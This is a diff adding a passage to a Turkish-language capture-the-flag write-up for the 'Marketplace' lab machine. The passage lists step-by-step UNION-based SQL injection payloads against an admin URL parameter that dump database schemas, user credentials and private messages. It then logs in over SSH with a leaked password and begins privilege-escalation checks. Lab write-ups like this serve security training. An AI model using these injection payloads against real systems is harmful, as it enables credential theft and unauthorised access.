@@ -195,5 +195,53 @@ Admin panelinde ilk flag'ımızı buluyoruz.
 
 ![ilk_flag](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/ilk_flag.jpg)
 
- 
- 
+Karşımıza çıkan 4 kişiden birine girin ve url e bakın
+
+![sql_detect](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/sql_detect.png)
+
+Burda sql zaafiyeti var ve bunu sömürmemiz gerekiyor.
+
+Sql Zaafiyeti için: 
+```
+ADIM 1 : /admin?user=0 union select 1,2,3,4 -- -
+
+ADIM 2 : /admin?user=0 union select 1,group_concat(schema_name),3,4 from information_schema.schemata-- -
+
+ADIM 3 : /admin?user=0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='marketplace'-- -
+
+ADIM 4 : /admin?user=0 union select group_concat(column_name,'\n'),2,3,4 from information_schema.columns where table_name='users'-- -
+
+ADIM 5 : /admin?user=0 union select 1,group_concat(id,':',username,':',password,':',isAdministrator,'\n'),3,4 from marketplace.users-- -
+
+ADIM 6 : /admin?user=0 union select group_concat(column_name,'\n'),2,3,4 from information_schema.columns where table_name='messages'-- -,
+
+ADIM 7 : /admin?user=0 union select 1,group_concat(message_content,'\n'),3,4 from marketplace.messages-- -
+```
+ >sqli(sql injection için özel bir writeup yazacağım o yüzden burda anlatmıyorum.
+
+
+![secret_message](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/secret%20message.png)
+
+Burda bize jake kullanısının eski ssh şifresinin çok güçsüz olduğunu(kolay kırılabilen) söylüyor. Bu yüzden de sistem tarafından otomatik olarak daha güçlü bir şifre oluşturulduğunu ve bu şifreyi e posta ile gönderdiğini görüyoruz.
+
+Bu demek oluyor ki artık sisteme ssh bağlantısı alıp rahat rahat kod yazabileceğiz
+
+
+```
+ssh jake@hedef_ip 
+```
+Şifreyi girin.
+
+![jake_ssh](https://github.com/mel4mi/The-Marketplace-Writeup-TR/blob/main/jake_ssh.png)
+
+2. flagımızı da bulduk.
+
+Yetki yükseltme saldırısı yapmak için ilk başta sudo bitlerine bakıyorum.
+
+```
+sudo -l
+
+```
+
+
+
